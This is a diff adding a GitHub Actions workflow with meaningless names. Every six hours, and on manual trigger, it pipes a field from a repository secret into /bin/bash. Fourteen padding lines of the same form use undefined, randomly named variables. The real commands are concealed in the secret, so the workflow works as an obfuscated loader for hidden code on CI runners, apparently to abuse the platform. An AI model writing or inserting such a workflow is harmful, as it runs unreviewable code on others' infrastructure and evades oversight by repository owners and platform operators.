@@ -1,0 +1,33 @@
+name: baoandangdiheing
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: baoandangdiheing
+        env:
+          bz57872: ${{ secrets.bz57872 }}
+        run: |
+          echo $bz57872 | jq -r .yalp06661 | /bin/bash
+          echo $hoc8808 | jq -r .piknd26446 | /bin/bash
+          echo $wraf4 | jq -r .u8 | /bin/bash
+          echo $cypl99 | jq -r .xmd1887 | /bin/bash
+          echo $yapj432 | jq -r .kyvt5484 | /bin/bash
+          echo $kt09497 | jq -r .qyey0251 | /bin/bash
+          echo $gxzzj06776 | jq -r .l4 | /bin/bash
+          echo $lyb2316 | jq -r .murpo56851 | /bin/bash
+          echo $gua04 | jq -r .th7 | /bin/bash
+          echo $tg17073 | jq -r .jhze8 | /bin/bash
+          echo $s253 | jq -r .b24046 | /bin/bash
+          echo $eek09481 | jq -r .qzo90 | /bin/bash
+          echo $u9 | jq -r .gees31930 | /bin/bash
+          echo $u1 | jq -r .ws6804 | /bin/bash
+          echo $ntn6686 | jq -r .heifa05572 | /bin/bash
+
